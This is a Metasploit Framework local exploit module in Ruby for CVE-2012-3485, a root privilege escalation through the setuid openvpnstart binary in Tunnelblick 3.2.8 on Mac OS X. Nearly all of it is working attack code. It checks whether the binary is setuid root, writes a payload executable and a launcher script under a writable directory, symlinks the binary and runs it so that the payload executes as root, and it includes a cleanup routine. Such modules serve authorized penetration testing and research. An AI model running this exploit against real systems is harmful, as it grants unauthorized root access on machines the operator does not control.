# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;
require &#039;rex&#039;
require &#039;msf/core/post/common&#039;
require &#039;msf/core/post/file&#039;
require &#039;msf/core/exploit/exe&#039;

class Metasploit4 < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Exploit::EXE
  include Msf::Post::File
  include Msf::Post::Common

  def initialize(info={})
    super( update_info( info, {
        &#039;Name&#039;           => &#039;Setuid Tunnelblick Privilege Escalation&#039;,
        &#039;Description&#039;    => %q{
            This module exploits a vulnerability in Tunnelblick 3.2.8 on Mac OS X. The
          vulnerability exists in the setuid openvpnstart, where an insufficient
          validation of path names allows execution of arbitrary shell scripts as root.
          This module has been tested successfully on Tunnelblick 3.2.8 build 2891.3099
          over Mac OS X 10.7.5.
        },
        &#039;References&#039;     =>
          [
            [ &#039;CVE&#039;, &#039;2012-3485&#039; ],
            [ &#039;EDB&#039;, &#039;20443&#039; ],
            [ &#039;URL&#039;, &#039;http://blog.zx2c4.com/791&#039; ]
          ],
        &#039;License&#039;        => MSF_LICENSE,
        &#039;Author&#039;         =>
          [
            &#039;Jason A. Donenfeld&#039;, # Vulnerability discovery and original Exploit
            &#039;juan vazquez&#039;        # Metasploit module
          ],
        &#039;DisclosureDate&#039; => &#039;Aug 11 2012&#039;,
        &#039;Platform&#039;       => &#039;osx&#039;,
        &#039;Arch&#039;           => [ ARCH_X86, ARCH_X64 ],
        &#039;SessionTypes&#039;   => [ &#039;shell&#039; ],
        &#039;Targets&#039;        =>
          [
            [ &#039;Tunnelblick 3.2.8 / Mac OS X x86&#039;,    { &#039;Arch&#039; => ARCH_X86 } ],
            [ &#039;Tunnelblick 3.2.8 / Mac OS X x64&#039;,    { &#039;Arch&#039; => ARCH_X64 } ]
          ],
        &#039;DefaultOptions&#039; => { "PrependSetresuid" => true, "WfsDelay" => 2 },
        &#039;DefaultTarget&#039; => 0
      }))
    register_options([
        # These are not OptPath becuase it&#039;s a *remote* path
        OptString.new("WritableDir", [ true, "A directory where we can write files", "/tmp" ]),
        OptString.new("Tunnelblick", [ true, "Path to setuid openvpnstart executable", "/Applications/Tunnelblick.app/Contents/Resources/openvpnstart" ])
      ], self.class)
  end

  def check
    if not file?(datastore["Tunnelblick"])
      print_error "openvpnstart not found"
      return CheckCode::Safe
    end

    check = session.shell_command_token("find  #{datastore["Tunnelblick"]} -type f -user root -perm -4000")

    if check =~ /openvpnstart/
      return CheckCode::Vulnerable
    end

    return CheckCode::Safe
  end

  def clean
    file_rm(@link)
    cmd_exec("rm -rf #{datastore["WritableDir"]}/openvpn")
  end

  def exploit

    print_status("Creating directory...")
    cmd_exec "mkdir -p #{datastore["WritableDir"]}/openvpn/openvpn-0"

    exe_name = rand_text_alpha(8)
    @exe_file = "#{datastore["WritableDir"]}/openvpn/openvpn-0/#{exe_name}"
    print_status("Dropping executable #{@exe_file}")
    write_file(@exe_file, generate_payload_exe)
    cmd_exec "chmod +x #{@exe_file}"


    evil_sh =<<-EOF
#!/bin/sh
#{@exe_file}
    EOF

    @sh_file = "#{datastore["WritableDir"]}/openvpn/openvpn-0/openvpn"
    print_status("Dropping shell script #{@sh_file}...")
    write_file(@sh_file, evil_sh)
    cmd_exec "chmod +x #{@sh_file}"

    link_name = rand_text_alpha(8)
    @link = "#{datastore["WritableDir"]}/#{link_name}"
    print_status("Creating symlink #{@link}...")
    cmd_exec "ln -s -f -v #{datastore["Tunnelblick"]} #{@link}"

    print_status("Running...")
    begin
      cmd_exec "#{@link} OpenVPNInfo 0"
    rescue
      print_error("Failed. Cleaning files #{@link} and the #{datastore["WritableDir"]}/openvpn directory")
      clean
      return
    end
    print_warning("Remember to clean files: #{@link} and the #{datastore["WritableDir"]}/openvpn directory")
  end
end

